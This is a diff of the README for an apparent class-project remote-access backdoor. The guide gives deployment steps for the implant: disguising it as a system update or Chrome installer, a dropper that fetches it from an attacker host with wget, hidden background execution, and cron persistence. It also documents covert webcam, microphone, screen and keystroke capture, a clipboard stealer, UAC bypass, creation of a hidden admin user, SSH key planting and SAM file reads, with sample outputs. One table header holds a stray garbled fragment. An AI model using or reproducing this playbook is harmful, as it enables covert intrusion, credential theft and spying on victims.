@@ -46,7 +46,7 @@ cd DES484_Backdoor
 
 # Verify all files are present
 ls -la
-# Should see: backdoor.py, server.py, features/, logs/, requirements.txt, README.md
+# Should see: server.py, backdoor.py, features/, logs/, requirements.txt, README.md
 
 # Check Python version (must be 3.6+)
 python3 --version
@@ -154,23 +154,23 @@ zip -r backdoor_full.zip DES484_Backdoor/
 
 ### Phase 2: Configuration
 
-#### 2.1 Configure Attacker (backdoor.py)
+#### 2.1 Configure Attacker (server.py)
 
-The backdoor.py is already configured to listen on all interfaces (0.0.0.0).
+The server.py is already configured to listen on all interfaces (0.0.0.0).
 No changes needed unless you want a different port:
 
 ```python
-# In backdoor.py (already configured):
+# In server.py (already configured):
 HOST = '0.0.0.0'  # Listen on all interfaces
 PORT = 5555       # Default port
 ```
 
-#### 2.2 Configure Target (server.py)
+#### 2.2 Configure Target (backdoor.py)
 
-**Edit server.py and update these lines:**
+**Edit backdoor.py and update these lines:**
 
 ```python
-# At the bottom of server.py (around line 490)
+# At the bottom of backdoor.py (around line 490)
 if __name__ == "__main__":
     # Configuration - Change these to match your attacker machine
     ATTACKER_HOST = '192.168.1.12'  # ← Change to YOUR attacker IP
@@ -245,9 +245,9 @@ cp -r /mnt/shared/DES484_Backdoor /tmp/
 
 ```bash
 # Rename to look legitimate
-mv server.py system_update.py
+mv backdoor.py system_update.py
 # or
-mv server.py chrome_installer.py
+mv backdoor.py chrome_installer.py
 
 # Create wrapper script
 cat > update.sh << 'EOF'
@@ -272,10 +272,10 @@ cd /tmp
 mkdir -p .system
 cd .system
 # Download backdoor (from your server)
-wget http://attacker-ip:8000/server.py
+wget http://attacker-ip:8000/backdoor.py
 wget http://attacker-ip:8000/features.tar.gz
 tar -xzf features.tar.gz
-python3 server.py &
+python3 backdoor.py &
 EOF
 ```
 
@@ -286,7 +286,7 @@ EOF
 ```bash
 # On attacker machine
 cd ~/Desktop/DES484_Backdoor
-python3 backdoor.py
+python3 server.py
 
 # You should see:
 # ╔═══════════════════════════════════════════════════════════════╗
@@ -306,7 +306,7 @@ python3 backdoor.py
 ```bash
 # On target machine
 cd /tmp/DES484_Backdoor
-python3 server.py
+python3 backdoor.py
 
 # You should see:
 # [*] Attempting to connect to 192.168.1.12:5555...
@@ -317,10 +317,10 @@ python3 server.py
 
 ```bash
 # Run in background
-nohup python3 server.py > /dev/null 2>&1 &
+nohup python3 backdoor.py > /dev/null 2>&1 &
 
 # Or with systemd (Linux)
-python3 server.py &
+python3 backdoor.py &
 disown
 ```
 
@@ -328,7 +328,7 @@ disown
 
 ```bash
 # Add to crontab (runs every reboot)
-(crontab -l 2>/dev/null; echo "@reboot python3 /tmp/DES484_Backdoor/server.py") | crontab -
+(crontab -l 2>/dev/null; echo "@reboot python3 /tmp/DES484_Backdoor/backdoor.py") | crontab -
 ```
 
 #### 4.3 Verify Connection
@@ -356,13 +356,20 @@ Release: 5.15.0
 | `screenshot_multi <count> <interval>` | Multiple screenshots | `screenshot_multi 5 2` |
 | `screenshot_list` | List all screenshots | `screenshot_list` |
 | `record_screen <duration> <fps>` | Record screen (timed) | `record_screen 30 15` |
-| `record_start <max_duration>` | Start background recording | `record_start 3600` |
+| `record_start [max_duration]` | Start background recording | `record_start 3600` |
 | `record_stop` | Stop background recording | `record_stop` |
 | `record_status` | Check recording status | `record_status` |
 | `record_list` | List all recordings | `record_list` |
-| `audio_record <seconds>` | Record audio | `audio_record 10` |
+| `audio_start` | Start background audio recording | `audio_start` |
+| `audio_stop` | Stop audio recording | `audio_stop` |
+| `audio_status` | Check audio recording status | `audio_status` |
+| `audio_record <seconds>` | Record audio (fixed duration) | `audio_record 10` |
 | `audio_list` | List audio recordings | `audio_list` |
-| `webcam_snap` | Capture webcam image | `webcam_snap` |
+| `webcam_start` | Start background webcam recording | `webcam_start` |
+| `webcam_stop` | Stop webcam recording | `webcam_stop` |
+| `webcam_status` | Check webcam recording status | `webcam_status` |
+| `webcam_snap` | Capture webcam image (single frame) | `webcam_snap` |
+| `webcam_list` | List webcam images and videos | `webcam_list` |
 
 **Keylogger:**
 | Command | Description | Example |
@@ -390,11 +397,25 @@ Release: 5.15.0
 |---------|-------------|---------|
 | `priv_check` | Check current privileges | `priv_check` |
 | `priv_enum` | Enumerate escalation vectors | `priv_enum` |
+| `priv_scan` | Comprehensive escalation scan | `priv_scan` |
 | `priv_services` | List running services | `priv_services` |
+| `priv_tasks` | Check scheduled tasks | `priv_tasks` |
+| `priv_sensitive` | Find sensitive files | `priv_sensitive` |
+| `priv_weak_perms` | Find exploitable file permissions | `priv_weak_perms` |
+| `priv_uac_bypass` | Attempt UAC bypass (Windows) | `priv_uac_bypass` |
+| `priv_dll_hijack` | Find DLL hijacking opportunities | `priv_dll_hijack` |
+| `priv_docker` | Docker-based escalation | `priv_docker` |
+| `priv_persist [path]` | Create persistence mechanism | `priv_persist` |
+| `priv_user [user] [pass]` | Create backdoor user | `priv_user admin Pass123` |
+| `priv_ssh_key [key]` | Plant SSH key | `priv_ssh_key "ssh-rsa AAA..."` |
+| `priv_sudo [pass]` | Sudo escalation with password | `priv_sudo MyPass123` |
+| `priv_read_file <path>` | Read admin-protected text file | `priv_read_file C:\Windows\System32\config\SAM` |
+| `priv_read_binary <path>` | Read admin-protected binary file (base64) | `priv_read_binary C:\Windows\System32\cmd.exe` |
+| `priv_list_dir <path>` | List admin-protected directory | `priv_list_dir C:\Windows\System32\config` |
 | `sysinfo` | Display system information | `sysinfo` |
 
 **Network:**
-| Command | Description | Example |
+| Command | Description | Example |\_sclc_clu
 |---------|-------------|---------|
 | `net_info` | Display network info | `net_info` |
 | `net_scan` | Scan local network | `net_scan` |
@@ -468,7 +489,7 @@ user
 total 64
 drwxr-xr-x  6 user user  4096 Oct  3 14:00 .
 drwxrwxrwt 20 root root  4096 Oct  3 13:59 ..
--rw-r--r--  1 user user  1234 Oct  3 14:00 backdoor.py
+-rw-r--r--  1 user user  1234 Oct  3 14:00 server.py
 ... (other files)
 ```
 
@@ -592,23 +613,284 @@ priv_enum
 Response: Lists privilege escalation vectors and current privileges
 
 ```
+priv_scan
+```
+
+Response: Comprehensive JSON data with all escalation findings
+
+```
 priv_services
 ```
 
 Response: Lists important services and their status
 
+```
+priv_tasks
+```
+
+Response: Lists scheduled tasks and cron jobs
+
+```
+priv_sensitive
+```
+
+Response: Lists sensitive files (credentials, keys, configs)
+
+```
+priv_weak_perms
+```
+
+Response: Lists files with exploitable permissions
+
+```
+priv_uac_bypass
+```
+
+Response (Windows): Attempts UAC bypass using multiple methods
+
+```
+priv_dll_hijack
+```
+
+Response (Windows): Lists DLL hijacking opportunities
+
+```
+priv_docker
+```
+
+Response: Attempts Docker-based privilege escalation
+
+```
+priv_persist
+```
+
+Response: Creates persistence mechanisms (registry, cron, systemd)
+
+```
+priv_user admin SecurePass123
+```
+
+Response: Creates backdoor user with admin privileges
+
+```
+priv_ssh_key "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..."
+```
+
+Response: Plants SSH key in authorized_keys
+
+```
+priv_sudo UserPassword123
+```
+
+Response: Attempts sudo escalation with provided password
+
+##### Admin File Access (New!)
+
+```
+priv_read_file C:\Windows\System32\config\SAM
+```
+
+Response: Reads admin-protected text files with automatic fallback methods
+
+```
+priv_read_binary C:\Windows\System32\cmd.exe
+```
+
+Response: Reads binary files and returns base64-encoded content
+
+```
+priv_list_dir C:\Windows\System32\config
+```
+
+Response: Lists contents of admin-protected directories
+
 ##### How It Works
 
-1. **priv_check**: Checks if the process has elevated privileges (root/admin)
-2. **priv_enum**: Enumerates possible privilege escalation vectors (e.g., SUID binaries, weak services)
-3. **priv_services**: Lists critical system services and their privilege level
+1. **priv_check**: Checks if the process has elevated privileges (root/admin) and displays user information
+2. **priv_enum**: Enumerates SUID binaries, sudo opportunities, writable paths, and kernel version
+3. **priv_scan**: Comprehensive scan including all enumeration techniques plus services, tasks, files, and Docker
+4. **priv_services**: Lists critical system services and their privilege level
+5. **priv_tasks**: Lists cron jobs (Linux/macOS) or scheduled tasks (Windows)
+6. **priv_sensitive**: Searches for credential files, SSH keys, configs, and history files
+7. **priv_weak_perms**: Finds world-writable files, writable SUID binaries, and modifiable services
+8. **priv_uac_bypass**: Attempts UAC bypass on Windows using fodhelper and ComputerDefaults methods
+9. **priv_dll_hijack**: Searches for missing DLLs that can be hijacked in writable directories
+10. **priv_docker**: Checks if Docker is available and attempts to mount host filesystem as root
+11. **priv_persist**: Creates persistence via registry, cron, bashrc, or systemd
+12. **priv_user**: Creates a new user account with admin/sudo privileges
+13. **priv_ssh_key**: Adds SSH public key to authorized_keys for persistent access
+14. **priv_sudo**: Attempts to execute sudo command with provided password
+15. **priv_read_file**: Reads admin-protected text files using multiple fallback methods (direct Python I/O, PowerShell, shell commands)
+16. **priv_read_binary**: Reads binary files and returns base64-encoded content for safe transmission
+17. **priv_list_dir**: Lists contents of admin-protected directories with file/directory separation
 
 ##### Output Example
 
+**priv_check:**
+
+```json
+{
+  "system": "Linux",
+  "is_admin": false,
+  "user": "john",
+  "uid": 1000,
+  "groups": "john adm sudo"
+}
 ```
-[+] Privilege: root
-[+] SUID Binaries: /usr/bin/passwd, /usr/bin/sudo
-[+] Services: sshd (root), cups (user)
+
+**priv_enum:**
+
+```
+=== Privilege Enumeration ===
+
+SUID Binaries:
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/find
+
+Sudo Opportunities:
+User john may run the following commands:
+  (ALL : ALL) ALL
+  (root) NOPASSWD: /usr/bin/systemctl restart apache2
+
+Writable Paths:
+/home/john/.local/bin
+/tmp
+
+Kernel/System Version:
+Linux 5.15.0-92-generic
+```
+
+**priv_scan:**
+
+```json
+{
+  "status": {
+    "system": "Linux",
+    "is_admin": false,
+    "user": "john",
+    "uid": 1000
+  },
+  "sudo_opportunities": "User john may run...",
+  "suid_binaries": "/usr/bin/passwd\n/usr/bin/sudo...",
+  "writable_paths": "/home/john/.local/bin",
+  "kernel_info": "Linux 5.15.0-92-generic",
+  "services": "apache2 RUNNING root",
+  "scheduled_tasks": "0 2 * * * /root/cleanup.sh",
+  "sensitive_files": "/home/john/.ssh/id_rsa\n/home/john/.aws/credentials",
+  "weak_file_permissions": ["/opt/backup/run.sh (World writable)"],
+  "docker_escalation": "Docker not available"
+}
+```
+
+**priv_weak_perms:**
+
+```
+Exploitable Files:
+/opt/backup/run.sh (World writable)
+/etc/apache2/apache2.conf (Group writable)
+/usr/local/bin/update.sh (World writable + in PATH)
+```
+
+**priv_uac_bypass (Windows):**
+
+```
+UAC bypass attempts: fodhelper.exe bypass attempted, ComputerDefaults.exe bypass attempted
+```
+
+**priv_dll_hijack (Windows):**
+
+```
+DLL Hijacking Opportunities:
+C:\Program Files\CustomApp\app.exe -> version.dll
+C:\Users\John\AppData\Local\App\program.exe -> dwmapi.dll
+```
+
+**priv_docker:**
+
+```
+Docker escalation possible - can access host filesystem as root:
+uid=0(root) gid=0(root) groups=0(root)
+root
+```
+
+**priv_persist:**
+
+```
+Persistence mechanisms: Registry Run key created, Scheduled task created (SYSTEM)
+```
+
+**priv_user:**
+
+```
+Backdoor user 'admin' created and hidden
+```
+
+**priv_ssh_key:**
+
+```
+SSH key planted in current user's authorized_keys; SSH key planted in root's authorized_keys
+```
+
+**priv_sudo:**
+
+```
+Sudo access gained: root
+```
+
+**priv_read_file:**
+
+```
+=== Admin File Read ===
+File: C:\Windows\System32\drivers\etc\hosts
+Method: powershell
+Is Admin: False
+
+Content (150 lines):
+# Copyright (c) 1993-2009 Microsoft Corp.
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+127.0.0.1       localhost
+::1             localhost
+```
+
+**priv_read_binary:**
+
+```
+=== Admin Binary File Read ===
+File: C:\Windows\System32\cmd.exe
+Method: direct_binary_read
+File Size: 289,792 bytes
+Is Admin: True
+
+Base64 Content (preview - first 200 chars):
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+
+Full Base64 Content:
+[Full base64 encoded content follows...]
+```
+
+**priv_list_dir:**
+
+```
+=== Admin Directory Listing ===
+Directory: C:\Windows\System32\config
+Method: direct_listing
+Is Admin: False
+
+Directories (3):
+  - systemprofile
+  - TxR
+  - RegBack
+
+Files (15):
+  - BBI (size: 65,536 bytes)
+  - BCD-Template (size: 25,600 bytes)
+  - DEFAULT (size: 262,144 bytes)
+  - SAM (size: 262,144 bytes)
+  - SECURITY (size: 262,144 bytes)
+  - SOFTWARE (size: 45,088,768 bytes)
+  - SYSTEM (size: 17,301,504 bytes)
+  [...]
 ```
 
 #### Screen Capture
@@ -727,7 +1009,7 @@ record_screen 20 10
 
 Records for 20 seconds at 10 fps for smaller file size
 
-**Background Recording:**
+**Background Recording (Recommended):**
 
 Start a background recording that continues until manually stopped:
 
@@ -743,7 +1025,14 @@ record_start 600
 
 Starts recording with max duration of 600 seconds (10 minutes)
 
-Response: Background recording started with filepath
+**What happens:**
+
+- Starts non-blocking screen recording in background
+- Uses ffmpeg for best quality (falls back to OpenCV/MSS if unavailable)
+- Recording continues until stopped or max duration reached
+- Returns immediately - doesn't block other operations
+
+Response: `[+] Background recording started: logs/recordings/screen_recording_20251005_150000.mp4`
 
 ##### Check Recording Status
 
@@ -753,7 +1042,7 @@ record_status
 
 Shows current recording status and filepath if recording is active
 
-Response: "Recording in progress: logs/recordings/screen_recording_20251003_150000.mp4" or "No active recording"
+Response: `Recording in progress: logs/recordings/screen_recording_20251005_150000.mp4` or `No active recording`
 
 ##### Stop Background Recording
 
@@ -763,7 +1052,7 @@ record_stop
 
 Stops the current background recording and finalizes the video file
 
-Response: Recording stopped message with final file size
+Response: `[+] Recording stopped and saved: logs/recordings/screen_recording_20251005_150000.mp4 (32.5 MB)`
 
 ##### List All Recordings
 
@@ -796,27 +1085,27 @@ Downloads the specified video recording file
 # Start background recording
 > record_start 1800
 
-[+] Background recording started: logs/recordings/screen_recording_20251003_150000.mp4
+[+] Background recording started: logs/recordings/screen_recording_20251005_150000.mp4
 
 # Check status after some time
 > record_status
 
-Recording in progress: logs/recordings/screen_recording_20251003_150000.mp4
+Recording in progress: logs/recordings/screen_recording_20251005_150000.mp4
 
 # Stop when done
 > record_stop
 
-[+] Recording stopped and saved: logs/recordings/screen_recording_20251003_150000.mp4 (125.8 MB)
+[+] Recording stopped and saved: logs/recordings/screen_recording_20251005_150000.mp4 (125.8 MB)
 
 # List all recordings
 > record_list
 
 Available recordings:
-screen_recording_20251003_150000.mp4 (125.8 MB)
-screen_recording_20251003_143000.mp4 (45.2 MB)
+screen_recording_20251005_150000.mp4 (125.8 MB)
+screen_recording_20251005_143000.mp4 (45.2 MB)
 
 # Download the recording
-> download logs/recordings/screen_recording_20251003_150000.mp4
+> download logs/recordings/screen_recording_20251005_150000.mp4
 
 [+] Downloading file...
 [+] Download complete
@@ -873,72 +1162,234 @@ screen_recording_20251003_143000.mp4 (45.2 MB)
 
 #### Webcam Capture
 
+##### Background Webcam Recording (New)
+
+```
+webcam_start
+```
+
+**What happens:**
+
+- Starts continuous webcam video recording in background
+- Non-blocking - returns immediately
+- Recording continues until stopped
+- Supports ffmpeg and OpenCV methods
+- Default resolution: 640x480 at 15fps
+
+Response: `[+] Background webcam recording started: logs/webcam/webcam_recording_20251005_144500.mp4`
+
+**Check Status:**
+
+```
+webcam_status
+```
+
+Response: `Webcam recording in progress: logs/webcam/webcam_recording_20251005_144500.mp4`
+
+**Stop Recording:**
+
+```
+webcam_stop
+```
+
+Response: `[+] Webcam recording stopped and saved: logs/webcam/webcam_recording_20251005_144500.mp4 (25.7 MB)`
+
+##### Single Image Capture (Legacy)
+
 ```
 webcam_snap
 ```
 
 Response: Webcam image saved with timestamp
 
+**What happens:**
+
+- Accesses default webcam
+- Captures single frame
+- Saves as JPG with timestamp
+
+Response: `[+] Webcam image saved: logs/webcam/webcam_20251005_144500.jpg`
+
+##### List Webcam Media
+
 ```
-ls logs/webcam/
+webcam_list
 ```
 
-Shows: List of all captured webcam images
+Shows: List of all webcam images and videos
+
+Response:
 
 ```
-download logs/webcam/webcam_YYYYMMDD_HHMMSS.jpg
+[+] Webcam images and videos:
+  - webcam_recording_20251005_144500.mp4 (25.7 MB)
+  - webcam_20251005_144500.jpg (0.8 MB)
+  - webcam_20251004_120000.jpg (0.7 MB)
 ```
 
-Downloads the specified webcam image
+##### Download Webcam Media
+
+```
+download logs/webcam/webcam_recording_20251005_144500.mp4
+download logs/webcam/webcam_20251005_144500.jpg
+```
+
+Downloads the specified webcam file (video or image)
 
 ##### How It Works
 
-1. **Webcam Capture**: Takes a snapshot from the webcam and saves as JPG in logs/webcam/
-2. **Listing**: Shows all webcam images available for download
-3. **Download**: Allows retrieval of any webcam image file
+1. **Background Video Recording (webcam_start/stop)**:
+
+   - Starts non-blocking webcam recording in separate process/thread
+   - Uses ffmpeg if available, OpenCV as fallback
+   - Platform-specific capture methods (avfoundation on macOS, v4l2 on Linux, dshow on Windows)
+   - Continues recording until manually stopped
+   - Best for user monitoring, surveillance, extended recording
+
+2. **Single Frame Capture (webcam_snap)**:
+
+   - Takes instant snapshot from webcam using OpenCV
+   - Quick single-frame capture
+   - Saves as JPG image
+   - Best for user identification, quick photos
+
+3. **Requirements**:
+   - opencv-python library or ffmpeg
+   - Camera permissions on macOS/Windows
+   - Webcam must not be in use by another application
 
 ##### Output Example
 
 ```
-[+] Webcam image saved: logs/webcam/webcam_20251003_144500.jpg
-Available webcam images:
-- webcam_20251003_144500.jpg
-- webcam_20241002_150000.jpg
+# Background video recording
+> webcam_start
+[+] Background webcam recording started: logs/webcam/webcam_recording_20251005_144500.mp4
+
+> webcam_status
+Webcam recording in progress: logs/webcam/webcam_recording_20251005_144500.mp4
+
+> webcam_stop
+[+] Webcam recording stopped and saved: logs/webcam/webcam_recording_20251005_144500.mp4 (25.7 MB)
+
+# Single snapshot
+> webcam_snap
+[+] Webcam image saved: logs/webcam/webcam_20251005_144500.jpg
+
+# List all media
+> webcam_list
+[+] Webcam images and videos:
+  - webcam_recording_20251005_144500.mp4 (25.7 MB)
+  - webcam_20251005_144500.jpg (0.8 MB)
 ```
 
-#### Test Audio Recording
+#### Audio Recording
+
+##### Background Audio Recording (Recommended)
+
+```
+audio_start
+```
+
+**What happens:**
+
+- Starts continuous audio recording in background
+- Non-blocking - returns immediately
+- Recording continues until stopped
+- Supports multiple audio input methods (pyaudio, sox, ffmpeg, arecord)
+
+Response: `[+] Background audio recording started: logs/audio/audio_20251005_143530.wav`
+
+**Check Status:**
+
+```
+audio_status
+```
+
+Response: `Audio recording in progress: logs/audio/audio_20251005_143530.wav`
+
+**Stop Recording:**
+
+```
+audio_stop
+```
+
+Response: `[+] Audio recording stopped and saved: logs/audio/audio_20251005_143530.wav (15.3 MB)`
+
+##### Fixed Duration Recording (Legacy)
 
 ```
 audio_record 10
 ```
 
-Response: Records 10 seconds of audio from microphone and saves as WAV
+Response: Records 10 seconds of audio from microphone and saves as WAV (blocks until complete)
+
+##### List Audio Files
 
 ```
 audio_list
 ```
 
-Shows: List of all recorded audio files
+Shows: List of all recorded audio files with sizes
+
+Response:
 
 ```
-download logs/audio/audio_YYYYMMDD_HHMMSS.wav
+[+] Audio recordings:
+  - audio_20251005_143530.wav (15.3 MB)
+  - audio_20251005_141200.wav (3.2 MB)
+```
+
+##### Download Audio
+
+```
+download logs/audio/audio_20251005_143530.wav
 ```
 
 Downloads the specified audio file
 
 ##### How It Works
 
-1. **Audio Recording**: Records audio from the microphone for the specified duration and saves as WAV in logs/audio/
-2. **Listing**: Shows all audio recordings available for download
-3. **Download**: Allows retrieval of any audio file
+1. **Background Recording (audio_start/stop)**:
+
+   - Starts non-blocking audio recording in separate process
+   - Uses ffmpeg, sox, or arecord depending on availability
+   - Continues recording until manually stopped
+   - Best for meetings, conversations, extended monitoring
+
+2. **Fixed Duration (audio_record)**:
+
+   - Records audio for exact specified duration
+   - Blocks until recording completes
+   - Uses pyaudio library if available, system commands as fallback
+   - Best for quick audio snippets
+
+3. **Multiple Method Support**: Automatically falls back through:
+   - PyAudio (cross-platform, CD quality)
+   - System commands (sox on macOS, arecord on Linux, ffmpeg on all platforms)
+   - Requires microphone permissions
 
 ##### Output Example
 
 ```
-[+] Audio recorded: logs/audio/audio_20251003_145000.wav
-Available audio files:
-- audio_20251003_145000.wav
-- audio_20241002_150030.wav
+# Background recording
+> audio_start
+[+] Background audio recording started: logs/audio/audio_20251005_143530.wav
+
+> audio_status
+Audio recording in progress: logs/audio/audio_20251005_143530.wav
+
+> audio_stop
+[+] Audio recording stopped and saved: logs/audio/audio_20251005_143530.wav (15.3 MB)
+
+# Fixed duration
+> audio_record 30
+[+] Audio recorded: logs/audio/audio_20251005_145000.wav
+
+# List all
+> audio_list
+[+] Audio recordings:
+  - audio_20251005_143530.wav (15.3 MB)
+  - audio_20251005_145000.wav (3.2 MB)
 ```
 
 #### Clipboard Stealer
@@ -1271,7 +1722,7 @@ ip addr show
 
 ```bash
 # Run with appropriate permissions
-sudo python3 server.py
+sudo python3 backdoor.py
 
 # Or use privilege escalation features
 priv_enum
@@ -1285,7 +1736,7 @@ pip3 install pynput
 
 # Or run with proper display permissions
 export DISPLAY=:0
-python3 server.py
+python3 backdoor.py
 
 # macOS: Grant accessibility permissions
 # System Preferences > Security & Privacy > Privacy > Accessibility
@@ -1472,13 +1923,21 @@ clipboard_stop
 - [ ] Clipboard dump downloads automatically
 - [ ] Clipboard injection works
 - [ ] Privilege escalation enumeration works
+- [ ] Admin file read works (text files)
+- [ ] Admin file read works (binary files with base64)
+- [ ] Admin directory listing works
+- [ ] UAC bypass elevates privileges
 - [ ] Screenshot capture works
 - [ ] Screen recording works (timed and background)
 - [ ] Screen recording file size is reasonable
 - [ ] Recording status check works
 - [ ] Recording list displays all videos
-- [ ] Webcam capture works
-- [ ] Audio recording works
+- [ ] Webcam capture works (single image)
+- [ ] Webcam recording works (background video)
+- [ ] Webcam status check works
+- [ ] Audio recording works (fixed duration)
+- [ ] Audio background recording works
+- [ ] Audio status check works
 - [ ] Network discovery functions
 - [ ] Persistence installation works
 - [ ] Help commands display properly
@@ -1491,15 +1950,19 @@ For your class presentation:
 
 1. **Start with setup slide** - Show architecture diagram
 2. **Demonstrate basic features** - Connection, shell commands
-3. **Showcase keylogger** - Type in notepad, show capture
-4. **Show privilege escalation** - Enumerate vectors
-5. **Demonstrate screen capture** - Take and download screenshot
-6. **Demo screen recording** - Record activity, show video playback
-7. **Network discovery demo** - Scan network, find hosts
-8. **Persistence demo** - Install, reboot, reconnect
-9. **Discuss detections** - How it could be detected
-10. **Show cleanup** - Remove all traces
-11. **Ethical considerations** - Legal usage only
+3. **Showcase keylogger** - Type in notepad, show capture and dump
+4. **Show clipboard stealer** - Copy passwords, show capture and injection
+5. **Show privilege escalation** - Enumerate vectors
+6. **Demo admin file access** - Read SAM file, Chrome credentials, SSH keys (NEW!)
+7. **Demonstrate screen capture** - Take and download screenshot
+8. **Demo screen recording** - Start background recording, show status, stop, download video
+9. **Demo audio recording** - Start background audio, show status, stop, download
+10. **Demo webcam recording** - Start webcam recording, show status, stop, download
+11. **Network discovery demo** - Scan network, find hosts
+12. **Persistence demo** - Install, reboot, reconnect
+13. **Discuss detections** - How it could be detected
+14. **Show cleanup** - Remove all traces
+15. **Ethical considerations** - Legal usage only
 
 ## 🔐 Security Notes
 
